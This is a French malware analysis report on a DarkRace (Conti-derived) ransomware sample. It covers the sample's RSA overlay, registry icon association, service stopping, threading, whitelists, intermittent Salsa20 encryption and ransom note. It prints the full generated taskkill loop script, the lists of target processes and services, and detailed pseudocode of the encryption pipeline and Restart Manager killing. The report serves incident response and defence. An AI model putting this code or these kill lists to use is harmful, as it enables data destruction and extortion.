**Si l’overlay est absent / tronqué** (PE « nettoyé ») : `n` ou `e` vides → `sub_401A30` fait `ExitProcess`. Pas de chiffrement sans pubkey.

---

#### 2.5.3 — Layout des 527 octets (ce sample)

| Offset | Taille | Type | Valeur |
|--------|--------|------|--------|
| `0x000` | 512 | ASCII hex | Module **n** (256 octets binaires après `unhex`) = **RSA-2048** |
| `0x200` | 6 | ASCII hex | Exposant **e** = `010001` = **65537** |
| `0x206` | 9 | ASCII | Extension = `3fe57B660` |
| Total | **527** | | `512 + 6 + 9` |

```
0                512      518           527
|<- n hex ASCII ->|<- e ->|<- ext ---->|
 C5A0A7250B...FA5079 010001  3fe57B660
```

**Module (début / fin) :**

```
n = C5A0A7250BB5E100D5B01B4213804705668E783CC2384A791C77596933C4A18D
    ...
    BA3AD2749FA5079
```

- `len(unhex(n))` = **256** → RSA-2048 (Conti « classique » était souvent en 4096 ; DarkRace ici = 2048).
- `e = 65537` : exposant public standard Fermat F4.
- Extension **9 caractères** alphanumériques, **fixée au build** (pas aléatoire par machine) → toutes les victimes de **ce** binaire ont `.3fe57B660`.

Extraits disque :

```text
# overlay_extension.txt
3fe57B660

# overlay_rsa_n.hex (1 ligne, 512 chars)
C5A0A7250BB5E100...BA3AD2749FA5079
```

---

#### 2.5.4 — Consommation dans `sub_401A30` (lien avec §2.4)

```c
v4 = sub_402500(&file_buf);          // pointeur sur overlay

qmemcpy(n_hex, v4, 0x200);           // 512 chars → module
memcpy(e_hex,  v4 + 512, 6);         // "010001"
memcpy(ext,    v4 + 518, 9);         // "3fe57B660"
ext[9] = 0;

MultiByteToWideChar(..., ext, &lpWideCharStr);  // L"3fe57B660"

sub_406E20(&N, 16, n_hex);           // hex → big int
sub_406E20(&E, 16, e_hex);
sub_407BB0(&rsa_key, &N, ..., &E); // clé publique LibTomCrypt

sub_407C90(&rsa_key, ..., 16, Block, lpBuffer); // RSA(Block) → footer 512 o
```

| Champ overlay | Devient | Effet observable |
|---------------|---------|------------------|
| `n` + `e` | clé RSA publique | footer identique sur tous les fichiers du run (une fois `Block` fixé) |
| `3fe57B660` | `lpWideCharStr` | `*.3fe57B660`, `Readme.3fe57B660.txt`, clé registre `HKCR\.3fe57B660` |

**Any.RUN :** confirme l’extension unique `3fe57B660` sur Desktop/Documents.

---

#### 2.5.5 — Implications IR / défense

1. **IoC build** : hash de l’overlay ou du module `n` = fingerprint de la **campagne / build**, plus stable que le hash PE entier si seul le stub change.
2. **Pas de clé privée** dans l’overlay (uniquement `n`, `e`). Déchiffrement offline des victimes **impossible** avec le seul sample.
3. **Carving** : sur un dump disque, chercher fin de PE + 512 chars hex `[0-9A-F]` + `010001` + 9 chars d’extension.
4. **Piège** : « stripper » l’overlay pour « nettoyer » un PE casse le ransomware (exit), mais un build attaquant peut simplement renvoyer un PE re-stitché.
5. **RSA-2048** : encore solide en pratique contre factorisation ; le maillon faible opérationnel reste la clé privée côté opérateur / leaks, pas le format overlay.

---

#### 2.5.6 — Synthèse

```
argv[0] = chemin du PE
        │
        ▼
CreateFileA (+ éventuellement WNetAddConnection2A)
        │
        ▼
Buffer = fichier entier en RAM
        │
        ▼
offset = fin(.reloc) = 0x3B600
        │
        ▼
┌─────────────────────────────────────┐
│ n  (512 hex) │ e 010001 │ 3fe57B660 │  → 527 octets
└─────────────────────────────────────┘
        │                │
        ▼                ▼
   RSA public         extension globale
        │
        ▼
   RSA_encrypt(Block) → footer fichiers
```

---

## 3. Association d’icône (`sub_4033F0`) — process détaillé

Appelée à la fin de `sub_4030D0`, **après** la fixation de `lpWideCharStr` (extension). Explique les icônes « bizarres » du bureau sur **screen_05** Any.RUN.

### 3.1 Objectif

1. Donner une **icône unique** à tous les `*.3fe57B660` (pression psychologique / branding).
2. Forcer Explorer à rafraîchir les associations (`SHChangeNotify`).
3. Persister l’icône hors du dossier chiffré : `C:\ProgramData\icon.ico` (ProgramData est aussi en `white_folders` → pas ré-encrypté).

### 3.2 Dépose de l’icône

```c
f = fopen("C:\\ProgramData\\icon.ico", "wb");
b64 = config["ico"];                    // ~20 KB base64 dans le XML
decoded = base64_decode(b64);           // sub_408A50 (decode)
fwrite(decoded, ..., f);
fclose(f);
```

Source : balise `<ico>` de la config XOR (voir `darkrace_config_decrypted.xml`). Format ICO multi-résolution (32×32, 16×16, etc.).

### 3.3 Clés registre créées (extension = `3fe57B660`)

```c
sprintf(SubKey, ".%ls", lpWideCharStr);     // ".3fe57B660"
sprintf(ProgId, "%lsfile", lpWideCharStr);  // "3fe57B660file"

// 1) Lier l’extension au ProgID
RegCreateKeyExA(HKCR, ".3fe57B660", ..., KEY_ALL_ACCESS=0xF003F, ...);
RegSetValueExA(hKey, NULL, REG_SZ, "3fe57B660file");

// 2) Icône par défaut du ProgID (pattern Conti : ProgID\DefaultIcon)
RegCreateKeyExA(HKCR, "3fe57B660file\\DefaultIcon" /* ou équivalent */, ...);
RegSetValueExA(hKey, NULL, REG_SZ, "C:\\ProgramData\\icon.ico");

SHChangeNotify(SHCNE_ASSOCCHANGED=0x8000000, 0, 0, 0);
```

| Clé / valeur | Effet |
|--------------|-------|
| `HKCR\.3fe57B660` = `3fe57B660file` | Explorer traite l’ext comme type custom |
| `HKCR\3fe57B660file\DefaultIcon` → `icon.ico` | Icône affichée pour **tous** les fichiers chiffrés |
| `SHCNE_ASSOCCHANGED` | Refresh immédiat du shell (pas besoin de relogin) |

### 3.4 Ce que ça engendre

| Observé | Cause |
|---------|--------|
| screen_05 : icônes rose / non standard sur `*.3fe57B660` | Assoc HKCR + `icon.ico` |
| Fichiers « type inconnu » / ProgID custom | Plus d’association Word/PDF d’origine (l’ext a changé) |
| Artefact disque `C:\ProgramData\icon.ico` | IoC + preuve de run |
| Artefacts registre HKCR | Survie au reboot (jusqu’à nettoyage IR) |

**Pas** de persistence malware via Run key ici : uniquement cosmétique / UX ransomware.

---

## 4. Thread killer — `1.bat` (`StartAddress`) — process détaillé

Lancé depuis `sub_401F80` via `CreateThread(..., StartAddress, ...)`.

> Note : les balises config `<kill_processes>` / `<kill_services>` existent dans le XML mais **ne sont référencées nulle part** dans le code décompilé de ce build. Le killer et le stop services sont donc pilotés par la présence de listes / matches, pas par ces booléens.

### 4.1 Génération du script

```c
f = fopen("C:\\ProgramData\\1.bat", "wb");
fwrite(":start\r\n");
fwrite("ping 127.0.0.1 -n 2 >nul ");
for (proc in split(config["kill_keep"], ';')) {
  fwrite("& taskkill /f /im ");
  fwrite(proc);
  fwrite("* ");                 // wildcard suffixe
}
fwrite("\r\ngoto start");
fclose(f);
Sleep(1000);
WinExec("cmd /c C:\\ProgramData\\1.bat", SW_HIDE);
```

### 4.2 Script complet généré (ce sample)

Fichier aussi en racine : `1.bat`

```bat
:start
ping 127.0.0.1 -n 2 >nul & taskkill /f /im sql* & taskkill /f /im oracle* & taskkill /f /im mysq* & taskkill /f /im chrome* & taskkill /f /im veeam* & taskkill /f /im firefox* & taskkill /f /im excel* & taskkill /f /im msaccess* & taskkill /f /im onenote* & taskkill /f /im outlook* & taskkill /f /im powerpnt* & taskkill /f /im winword* & taskkill /f /im wuauclt* 
goto start
```

### 4.3 Cibles (`kill_keep`) et intention

| Préfixe | Cibles typiques | Pourquoi les tuer |
|---------|-----------------|-------------------|
| `sql*` / `oracle*` / `mysq*` | Moteurs DB | Libérer `.mdf`/`.ldf` / datafiles verrouillés |
| `veeam*` | Backup | Empêcher backup / VSS pendant l’attaque |
| `chrome*` / `firefox*` | Navigateurs | Profiles / fichiers ouverts |
| `excel*` / `winword*` / `powerpnt*` / `onenote*` / `outlook*` / `msaccess*` | Office | Documents verrouillés (handles) |
| `wuauclt*` | Windows Update | Réduire activité / locks système |

`/f` = force ; `*` = tout process dont l’image **commence** par le préfixe (`outlook.exe`, `OUTLOOK.EXE`, etc. selon règles `taskkill`).

### 4.4 Boucle et rythme

- `ping 127.0.0.1 -n 2` ≈ pause **1 s** entre chaque tour (pas un vrai check réseau).
- `goto start` → boucle **infinie** jusqu’au cleanup final (`del 1.bat` + kill `cmd.exe` dans §9).
- Tourne **en parallèle** du walk/encrypt.

### 4.5 Complément : Restart Manager

Même avec `taskkill`, certains fichiers restent verrouillés. `sub_4039D0` utilise **`RmStartSession` / `RmRegisterResources` / `RmGetList`** pour identifier (et aider à libérer) les process qui tiennent le fichier avant map/write — duo Conti classique : kill massif + RM ciblé.

### 4.6 Any.RUN / effets

- Signatures : *Executing commands from a .bat file*, *Uses TASKKILL.EXE to kill Office/Browsers*, *Runs PING.EXE to delay*.
- PIDs observés : `taskkill /f /im outlook*`, `winword*`, `oracle*`, `powerpnt*`, `firefox*`, `msaccess*`, + `ping`.
- Effet victime : Office/DB/browsers crashent en boucle pendant le chiffrement ; documents non sauvegardés perdus **avant** même le XOR.

---

## 5. Arrêt des services (`sub_4022E0` + `sub_403710`) — process détaillé

### 5.1 Motifs config `<services>`

```
vss;sql;svc$;memtas;mepocs;msexchange;sophos;veeam;backup;GxVss;GxBlr;GxFWD;GxCVD;GxCIMgr
```

| Motif | Cible typique | But |
|-------|---------------|-----|
| `vss` | Volume Shadow Copy | Renforcer anti-recovery (après wmic/vssadmin) |
| `sql` / `svc$` | SQL Server / instances | Libérer bases |
| `memtas` / `mepocs` | MePocs / related backup | Couper sauvegardes |
| `msexchange` | Exchange | Mail stores |
| `sophos` | AV Sophos | Réduire résistance / scans |
| `veeam` / `backup` | Backup Veeam & génériques | Couper jobs de backup |
| `GxVss` `GxBlr` `GxFWD` `GxCVD` `GxCIMgr` | Agent **Backup Exec / GalaxY (Veritas)** | Couper stack backup enterprise |

Matching = `strstr(ServiceName, motif)` → sous-chaîne, pas égalité exacte (ex. `sql` matche `MSSQLSERVER`, `SQLWriter`, …).

### 5.2 Phase A — `sub_4022E0` : résoudre les vrais noms de services

```c
OpenSCManagerA(..., SC_MANAGER_ALL_ACCESS /* ou fallback droits réduits */);
EnumServicesStatusExA(..., SERVICE_WIN32, SERVICE_STATE_ALL, ...);
// pour chaque service énuméré :
//   si strstr(name, motif) pour un motif de la liste → garder le nom
// retourne "ServiceA;ServiceB;..." (noms réels SCM)
```

Produit une liste **concrète** de services présents sur **cette** machine qui matchent les motifs. Si aucun match → pointeur NULL → pas de thread stop.

### 5.3 Phase B — `sub_403710` : thread d’arrêt en boucle

```c
CreateThread(..., sub_403710, matched_service_list, ...);

while (1) {   // __noreturn — boucle infinie
  OpenSCManagerA(...);
  for each service_name in list {
    OpenServiceA(..., SERVICE_STOP | QUERY | ENUMERATE_DEPENDENTS);
    if (state != STOPPED && state != STOP_PENDING) {
      // 1) arrêter les dépendants (EnumDependentServicesA)
      // 2) ControlService(SERVICE_CONTROL_STOP)
      // 3) poll QueryServiceStatusEx jusqu'à STOPPED ou timeout ~30s (0x7530 ms)
    }
  }
}
```

| Comportement | Détail |
|--------------|--------|
| Dépendances d’abord | Évite échec « service cannot be stopped » |
| Timeout ~30 s | `GetTickCount` + `Sleep(dwWaitHint)` |
| Boucle infinie | Comme `1.bat` : si un service redémarre, il est re-stopé |
| Droits | Besoin admin pour la plupart des stops |

### 5.4 Ce que ça engendre

- VSS / SQL / Veeam / Sophos / Backup Exec **down** pendant le run.
- Moins de locks sur bases et datastores → plus de fichiers chiffrables.
- Bruit Event Log System (service entered stopped state) — IoC SOC.
- Couplé aux `<cmd>` VSS (§2.3) : double attaque recovery (delete shadows **et** stop service VSS).

---

## 6. Orchestration multi-thread (`sub_401F80`) — process détaillé

Cœur du parallélisme Conti, appelé si `local_disks=true` (via `sub_403340`).

### 6.1 Paramètres (ce sample)

| Config | Valeur | Rôle |
|--------|--------|------|
| `walk_thread` | **15** | Threads qui parcourent l’arborescence / alimentent la queue |
| `encryption_thread` | **30** | Threads qui consomment la queue et chiffrent |
| `local_disks` | true | Active ce chemin |
| `network_shares` | **false** | Pas d’énum WNet dans `sub_403340` |

### 6.2 Séquence

```c
// Sync
mutex_queue_A = CreateMutexA(...);
mutex_queue_B = CreateMutexA(...);
semaphore    = CreateSemaphoreA(..., 0, MAXLONG, ...);

n_walk = atoi("15");
n_enc  = atoi("30");

// 1) Killer + services (en parallèle du walk)
CreateThread(StartAddress);                 // 1.bat
matched = sub_4022E0(split(services,';'));
if (matched)
  CreateThread(sub_403710, matched);        // stop services loop

// 2) Seeds : lecteurs locaux / réseau montés
GetLogicalDriveStringsW(...);
for each drive:
  type = GetDriveTypeW(drive);
  if (type == DRIVE_FIXED(3) || DRIVE_REMOTE(4))
    enqueue(drive_root);                    // ex. "C:", "D:"

// 3) Pipeline fichiers
CreateThread(sub_403E30);                   // feeder / discoverer
for (i = 0; i < 15; i++) {
  CreateThread(sub_4041A0);                 // walkers
  Sleep(300);                               // 0x12C — stagger
}
for (j = 0; j < 30; j++) {
  CreateThread(sub_403960);                 // encryptors → sub_4039D0
  Sleep(300);
}

WaitForSingleObject(feeder);
WaitForMultipleObjects(15, walkers, TRUE, INFINITE);
ReleaseSemaphore(semaphore, 30, ...);       // réveil / drain encryptors
WaitForMultipleObjects(30, encryptors, TRUE, INFINITE);
```

### 6.3 Rôles des threads

| Thread | Fonction | Fait |
|--------|----------|------|
| `StartAddress` | Killer | Génère/exécute `1.bat` |
| `sub_403710` | Service stopper | Stop boucle services matchés |
| `sub_403E30` | Feeder | Orchestre / attend la fin de découverte |
| `sub_4041A0` ×15 | Walkers | `FindFirstFileW` / `FindNextFileW`, appliquent whitelists, enqueue chemins |
| `sub_403960` ×30 | Encryptors | Dequeue → `sub_4039D0` (RM + Salsa20 + footer + rename) |

Mutexes protègent les listes chaînées de paths ; le semaphore synchronise la fin de phase encrypt.

### 6.4 Drives pris en compte

- **Inclus :** `DRIVE_FIXED` (HDD/SSD locaux), `DRIVE_REMOTE` (lettres déjà montées type `Z:`).
- **Exclus ici :** CDROM, RAM disk, etc.
- **Shares non montés :** code `WNetEnumResourceW` / `WNetAddConnection2W` présent dans `sub_403340`, mais **désactivé** car `network_shares=false`.

### 6.5 Effets

- Forte parallélisation I/O CPU → chiffrement rapide sur multi-core (Any.RUN : nombreux fichiers Desktop/Documents en peu de temps).
- Jusqu’à ~15+30+2 threads métier + process `cmd`/`taskkill` enfants.
- Stagger `Sleep(300)` : évite un pic de `CreateThread` instantané (léger anti-burst).

---

## 7. Whitelists pendant le walk — process détaillé

Pendant `FindFirstFileW`, chaque entrée est filtrée. Comparaison typique : nom/chemin passé en **minuscules** (`_strlwr`) puis `strstr` contre chaque token `;`-séparé.

Convention de retour Conti : `1` = **continuer / éligible**, `0` = **skip**.

### 7.1 Ordre logique des filtres

```
entrée FindFirst/Next
    │
    ├─ dossier ? → white_folders (sub_401C30 / walk) ─ match → NE PAS descendre
    │
    ├─ fichier = Readme.<ext>.txt ? → skip (ne pas re-chiffrer la note)
    │
    ├─ white_files ─ match → skip
    │
    ├─ extension == ext ransomware ? → skip (déjà chiffré)
    │
    ├─ white_extens ─ match → skip
    │
    └─ sinon → enqueue pour encryption
         (black_db ldf/mdf : flag / priorité SQL ; chemins SQL Server aussi forcés via sub_4016E0)
```

### 7.2 `white_folders` — 21 dossiers (ne pas traverser)

Comparaison sur le **nom** du dossier (souvent via `strstr` sur le path lowercasé) :

1. `$recycle.bin`  
2. `config.msi`  
3. `$windows.~bt`  
4. `$windows.~ws`  
5. `windows`  
6. `boot`  
7. `program files`  
8. `program files (x86)`  
9. `programdata`  
10. `system volume information`  
11. `tor browser`  
12. `windows.old`  
13. `intel`  
14. `msocache`  
15. `perflogs`  
16. `x64dbg`  
17. `public`  
18. `all users`  
19. `default`  
20. `microsoft`  
21. `appdata`

**Pourquoi :** éviter de casser le OS (boot loop), garder ProgramData (icon.ico, 1.bat), éviter Tor Browser (canal de paiement), réduire le bruit AV sur binaires système.  
**Effet collatéral :** données dans `AppData` / certains profils peuvent être **épargnées** si le filtre matche trop large (`microsoft`, `appdata`, `public`…).

### 7.3 `white_files` — 14 noms exclus

1. `bootmgr`  
2. `autorun.inf`  
3. `boot.ini`  
4. `bootfont.bin`  
5. `bootsect.bak`  
6. `desktop.ini`  
7. `iconcache.db`  
8. `ntldr`  
9. `ntuser.dat`  
10. `ntuser.dat.log`  
11. `ntuser.ini`  
12. `thumbs.db`  
13. `GDIPFONTCACHEV1.DAT`  
14. `d3d9caps.dat`

**Pourquoi :** fichiers système / profil / cache UI ; chiffrer `ntuser.dat` casse la session utilisateur.

### 7.4 `white_extens` — 50 extensions exclues

`386` `adv` `ani` `bat` `bin` `cab` `cmd` `com` `cpl` `cur` `deskthemepack` `diagcab` `diagcfg` `diagpkg` `dll` `drv` `exe` `hlp` `icl` `icns` `ico` `ics` `idx` `lnk` `mod` `mpa` `msc` `msp` `msstyles` `msu` `nls` `nomedia` `ocx` `prf` `ps1` `rom` `rtp` `scr` `shs` `spl` `sys` `theme` `themepack` `wpx` `lock` `key` `hta` `msi` `pdb` `search-ms`

**Pourquoi :** surtout binaires / scripts / thèmes / installers — garder assez de système pour afficher la note, ouvrir un browser/Tor, laisser la machine bootable.  
**Conséquence IR :** `.exe`/`.dll` non chiffrés → possible recovery partielle d’outils locaux, mais documents (office, images, db) sont la cible.

### 7.5 `black_db` — pas une whitelist

```
ldf;mdf
```

Extensions bases SQL : marquage / traitement dédié ( Conti pousse aussi explicitement ) :

```c
// sub_4016E0 — ajoute à la queue pour chaque FIXED drive :
"X:\\Program Files\\Microsoft SQL Server"
"X:\\Program Files (x86)\\Microsoft SQL Server"
```

→ les datafiles SQL sont **prioritaires / forcés**, pas exclus.

### 7.6 Autres skips implicites

- Fichiers déjà en `.3fe57B660` (extension du run).
- `Readme.3fe57B660.txt` (évite de boucler sur la note).
- Attributs système parfois filtrés (`dwFileAttributes & 4` system — selon branche walk).

### 7.7 Synthèse effets

| Liste | Action | Effet pratique |
|-------|--------|----------------|
| `white_folders` | Ne pas descendre | OS / ProgramData / Tor préservés |
| `white_files` | Ne pas chiffrer | Boot + profil de base OK |
| `white_extens` | Ne pas chiffrer | Binaires/scripts intacts |
| `black_db` + SQL paths | Cibler | Bases SQL attaquées en priorité |

---

## 8. Chiffrement fichier — Salsa20 + footer RSA

Deux implémentations quasi identiques côté logique crypto :

| Fonction | I/O | Particularité |
|----------|-----|---------------|
| `sub_4026C0` | `ReadFile` / `WriteFile` + `SetFilePointer` | Chemin « simple » |
| `sub_4039D0` | `CreateFileMapping` / `MapViewOfFile` | + **Restart Manager** si le fichier est verrouillé |

Les encryptors (`sub_403960`) appellent surtout `sub_4039D0`. Les deux appliquent la **même** politique de chunks et le même `sub_4045F0` (Salsa20).

Globals utilisés (fixés au §2.4) :

| Global | Rôle ici |
|--------|----------|
| `Block` | Clé session 16 octets → entrée Salsa20 |
| `lpBuffer` (global) | Footer RSA 512 octets collé en EOF |
| `lpWideCharStr` | Extension `3fe57B660` pour le rename + note |

---

### 8.1 Politique de chunks (chiffrement intermittent Conti)

But : **ne pas** XOR tout un fichier multi-Go (trop lent / trop d’I/O), tout en rendant le fichier inutilisable. On chiffre `N` fenêtres d’**1 Mo** espacées sur la taille.

```c
// sub_4026C0 / sub_4039D0 — calcul du nombre de chunks (v26 / v45)
//
// size = taille du fichier en octets
// chunk_len = taille d'une fenêtre à XOR (souvent 1 Mo)
// N        = nombre de fenêtres

uint64_t size = file_size;
int      N    = 1;           // défaut : 1 passage
size_t   chunk_len;

if (size <= 0x100000) {                 // <= 1 Mo
    // Fichier petit : on chiffre TOUT (pas d'intermittence)
    chunk_len = (size_t)size;           // longueur = taille exacte
    N = 1;
}
else {
    // Fichiers > 1 Mo : fenêtres fixes de 1 Mo
    chunk_len = 0x100000;               // 1 048 576 octets = 1 MiB

    if (size <= 0xA00000) {             // <= 10 Mo
        N = 1;                          // un seul Mo "au début de la grille"
                                        // (offset 0 * size/1 = 0)
    }
    else if (size <= 0x6400000) {       // <= 100 Mo (0x64 = 100, <<20)
        N = 5;                          // 5 Mo chiffrés, répartis sur le fichier
    }
    else {
        // > 100 Mo (et aussi si size high != 0, très gros fichiers)
        N = 100;                        // 100 Mo chiffrés max (espacés)
    }
}

// Exemples concrets :
//   500 Ko   → N=1, chunk=500Ko     → 100% chiffré
//   3 Mo     → N=1, chunk=1Mo       → ~33% (le 1er Mo de la grille)
//   50 Mo    → N=5, chunk=1Mo       → 5 Mo / 50 Mo = 10%
//   1 Go     → N=100, chunk=1Mo     → 100 Mo / 1 Go ≈ 10%
```

**Boucle d’écriture des chunks** (version commentée, logique commune) :

```c
// step = distance entre deux offsets de chunk
// Pour N=5 et size=50Mo : step = 50Mo/5 = 10Mo
//   i=0 → offset 0
//   i=1 → offset 10Mo
//   i=2 → offset 20Mo
//   ...
uint64_t step = size / N;

for (int i = 0; i < N; i++) {
    uint64_t offset = i * step;         // position de la i-ème fenêtre

    // --- chemin ReadFile (sub_4026C0) ---
    SetFilePointer(h, offset, ...);
    ReadFile(h, buf, chunk_len, ...);   // lit chunk_len octets (ou moins en EOF)

    // XOR en place avec Salsa20 (clé = Block, compteur lié à la position)
    sub_4045F0(
        Block,   // a1 : clé session 16 octets
        1,       // a2 : mode encrypt (choisit sub_404700 = Salsa20 32-byte key setup)
        &nonce,  // a3 : état/compteur 64-bit (évolue avec le stream)
        0,       // a4 : offset de départ dans le keystream pour CE buffer
        buf,     // a5 : pointeur données
        chunk_len// a6 : nombre d'octets à XOR
    );

    SetFilePointer(h, offset, ...);     // revenir au même offset
    WriteFile(h, buf, chunk_len, ...);  // écraser le chunk chiffré

    // --- chemin MapView (sub_4039D0) : même XOR, mais ---
    // MapViewOfFile(..., offset_aligné_granularity, chunk_len);
    // sub_4045F0(Block, 1, &nonce, 0, mapped_view, chunk_len);
    // UnmapViewOfFile(...);  // le write-back est fait par le mapper (PAGE_READWRITE)
}
```

**Pourquoi `offset = i * (size / N)` ?**

- Répartit les dégâts sur tout le fichier (pas seulement le début).
- Un ZIP/VMDK/DB partiellement XOR aux offsets irréguliers devient souvent **irrécupérable** sans la clé, même si 90% des octets sont encore « en clair » statistiquement.
- Gain perf Conti : plafonner à **100 Mo** XOR max par fichier énorme.

Schéma mémoire du fichier après coup :

```
| chunk0 XOR | ...clair... | chunk1 XOR | ...clair... | ... | chunkN-1 XOR | ... | FOOTER 512 |
^ offset 0                 ^ size/N              ^ (N-1)*size/N           ^ size
                                                                              |
                                                                    lpBuffer (RSA)
```

---

### 8.2 Footer RSA (fin de fichier)

Après les chunks :

```c
// sub_4026C0 — append classique
SetFilePointerEx(h, size, NULL, FILE_BEGIN);  // se placer à l'ANCIENNE fin
WriteFile(h, ::lpBuffer, 0x200, ...);         // écrit EXACTEMENT 512 octets
                                              // = RSA_encrypt(Block) calculé au §2.4
CloseHandle(h);

// sub_4039D0 — via mapping : agrandit d'abord le mapping à size+512
CreateFileMappingA(h, ..., PAGE_READWRITE,
                   high(size+512), low(size+512), NULL);
// puis MapView à l'offset `size` (aligné granularity) et :
memcpy(view + (size % granularity_adjust), lpBuffer, 0x200);
```

```c
// Ce que contient le footer (rappel) :
//   lpBuffer[0 .. 511] = RSA_pub(session_key Block)
//   → seule la clé PRIVÉE attaquant permet de retrouver Block
//   → sans Block, impossible de refaire le keystream Salsa20 des chunks
```

Taille finale ≈ `size + 512` (le rename a déjà eu lieu, voir 8.4).

---

### 8.3 Primitive Salsa20 (`sub_4045F0` / `sub_404700` / `sub_404850`)

Conti/DarkRace : **Salsa20** en mode stream, XOR octet à octet.

#### Setup de l’état 64 octets

```c
// sub_404850 (clé 32 octets effective via "expand 32-byte k")
// Conti duplique/arrange la clé 16 octets Block dans le layout Salsa20.

DWORD state[16];

// Constante sigma Salsa20 pour clé 256-bit (ici libellé Conti 32-byte) :
memcpy(state_words_for_constant, "expand 32-byte k", 16);
//   → 4 mots little-endian : "expa" | "nd 3" | "2-by" | "te k"

// Layout classique Salsa20 (simplifié) :
//   state[0,5,10,15]  = constantes "expand 32-byte k"
//   state[1..4]       = key[0..15]   (première moitié)
//   state[11..14]     = key[16..31]  (seconde moitié / dérivée Conti)
//   state[6..7]       = nonce / compteur (passé via a3 / v15)
//   state[8..9]       = compteur de bloc (position dans le fichier)

// sub_404700 : variante "expand 16-byte k" (tau) si autre mode ;
// ici a2==1 dans sub_4045F0 sélectionne le chemin encrypt principal (32-byte).
```

#### XOR du buffer

```c
// sub_4045F0(Block, mode=1, &counter, pos0, data, len)
//
// Pour chaque octet data[i] :
//   - tous les 64 octets (pos & 0x3F == 0), régénérer un bloc keystream :
//       counter_block = f(position_fichier);
//       salsa20_hash(state, keystream[64]);
//   - data[i] ^= keystream[i % 64];
//
// C'est un chiffrement de flux : chiffrer == déchiffrer == XOR.
// Rejouer le MÊME keystream (même Block + mêmes offsets) restaure le clair.

uint8_t keystream[64];
unsigned pos = pos0;                 // souvent 0 au début d'un chunk mappé

for (unsigned n = len; n > 0; --n, ++pos) {
    if ((pos & 0x3F) == 0) {         // nouveau bloc Salsa20 de 64 octets
        // Les 4 octets "compteur" sont dérivés de pos :
        //   ctr0 = pos >> 6;   ctr1 = pos >> 14;  ...
        // → le keystream dépend de la POSITION ABSOLUE dans le stream
        salsa20_block(Block, &counter_state, keystream);
    }
    data[pos - pos0] ^= keystream[pos & 0x3F];
}
```

**Points IR importants :**

1. Même `Block` pour **tous** les fichiers du run → un footer déchiffré (avec la privée) déchiffre **toute** la machine.
2. Le keystream dépend de la position : il faut XOR aux **mêmes offsets** `i * size/N` avec la même politique de chunks.
3. Les zones « en clair » restantes ne suffisent en général pas à reconstruire un document Office/DB cohérent.

---

### 8.4 Rename + ouverture fichier (avant le XOR)

Ordre Conti : **d’abord renommer**, ensuite chiffrer le fichier déjà en `.3fe57B660`.

```c
// Construit new_path = old_path + "." + extension
// Ex.  C:\Users\admin\Desktop\report.docx
//   →  C:\Users\admin\Desktop\report.docx.3fe57B660

new_path = concat(old_path, L".", lpWideCharStr);

SetFileAttributesW(old_path, FILE_ATTRIBUTE_NORMAL);  // 0x80
// Enlève ReadOnly/Hidden/System qui bloqueraient MoveFile / Write

MoveFileExW(
    old_path,
    new_path,
    MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH  /* flags 9u */
);
// Si le rename échoue → pas de chiffrement de CE fichier (return)

h = CreateFileW(
    new_path,
    GENERIC_READ | GENERIC_WRITE,   // 0xC0000000
    0,                              // share mode 0 = exclusif
    NULL,
    OPEN_EXISTING,                  // 3
    FILE_ATTRIBUTE_NORMAL,
    NULL
);
```

#### Si `CreateFileW` échoue : Restart Manager (`sub_4039D0`)

```c
// Le fichier est encore verrouillé (Word, SQL, …) malgré taskkill
do {
    RmStartSession(&session, 0, sessionKey);     // démarre une session RM
    RmRegisterResources(session, 1, &path, ...); // "qui utilise ce fichier ?"
    RmGetList(session, ..., &apps, ...);         // liste des process

    for (each app in apps) {
        // ignore certains status (4, 1000) + ignore soi-même
        if (pid != GetCurrentProcessId()) {
            hProc = OpenProcess(PROCESS_TERMINATE | SYNC, FALSE, pid);
            TerminateProcess(hProc, 0);          // kill ciblé du locker
            WaitForSingleObject(hProc, 5000);    // max 5 s
            CloseHandle(hProc);
        }
    }
    RmEndSession(session);

    h = CreateFileW(new_path, GENERIC_READ|GENERIC_WRITE, ...);
} while (h == INVALID_HANDLE_VALUE);
// Puis mapping + XOR comme ci-dessus
```

**Effet :** même si `1.bat` a raté un process, RM identifie le holder exact du handle et le tue.

---

### 8.5 Note de rançon (`sub_4012D0`)

Appelée **après** chaque fichier chiffré avec succès (chemin d’origine / dossier parent).

```c
void sub_4012D0(original_path) {
    // Nom de la note = "Readme." + extension + ".txt"
    sprintf(note_name, "Readme.%ls.txt", lpWideCharStr);
    // → "Readme.3fe57B660.txt"

    // Place la note DANS LE MÊME DOSSIER que le fichier
    // (remplace le filename par note_name après le dernier '\')
    note_path = directory_of(original_path) + "\\" + note_name;

    if (_waccess(note_path, 0) != 0) {   // n'existe pas encore ?
        // CreateFile CREATE_NEW — une seule note par dossier
        h = CreateFileW(note_path, GENERIC_WRITE, ..., CREATE_NEW, ...);
        content = config["content"];     // texte DarkRace du XML (§2.2)
        WriteFile(h, content, strlen(content), ...);
        CloseHandle(h);
    }
    // Si la note existe déjà → no-op (évite N notes pour N fichiers)
}
```

Contenu (extrait) :

```
~~~ DarkRace ransomware ~~~
>>>> Your data are stolen and encrypted
http://wkrlpub5k52rjigwxfm6m7ogid55kamgc5azxlq7zjgaopv33tgx2sqd.onion
Tox ID: BFB2C156D701B968...8A107EED0B97
Mail: darkrace@onionmail.org
```

Visible sur **screen_05** Any.RUN (Notepad + bureau plein de `*.3fe57B660`).

---

### 8.6 Pipeline complet (un fichier)

```c
// Vue d'ensemble commentée — ce que vit CHAQUE fichier éligible

// [1] Walker a enqueue { path, size }
// [2] Encryptor dequeue

// [3] Politique chunks selon size → N, chunk_len
// [4] new = path + ".3fe57B660"
// [5] SetFileAttributes NORMAL + MoveFileEx(path → new)
// [6] CreateFile(new) ; si fail → RestartManager kill holders → retry
// [7] for i in 0..N-1:
//         map/read  at offset i*(size/N), longueur chunk_len
//         buf[j] ^= salsa20(Block, position)[j]
//         write back
// [8] append / map-write footer lpBuffer (512 bytes RSA)
// [9] CloseHandle
// [10] sub_4012D0(path) → assure Readme.3fe57B660.txt dans le dossier
```

### 8.7 Synthèse IR

| Élément | Valeur / comportement |
|---------|----------------------|
| Algo fichier | Salsa20 (stream XOR), constante `"expand 32-byte k"` |
| Clé | `Block` 16 octets (ASCII), **une par run** |
| Récupération clé | Footer 512 o = RSA-2048(`Block`) avec pubkey overlay |
| Intermittence | 1 / 5 / 100 chunks de 1 Mo selon taille |
| Extension | `.3fe57B660` (rename **avant** encrypt) |
| Note | `Readme.3fe57B660.txt` **une fois par dossier** |
| Anti-lock | `taskkill` global + Restart Manager par fichier |

---

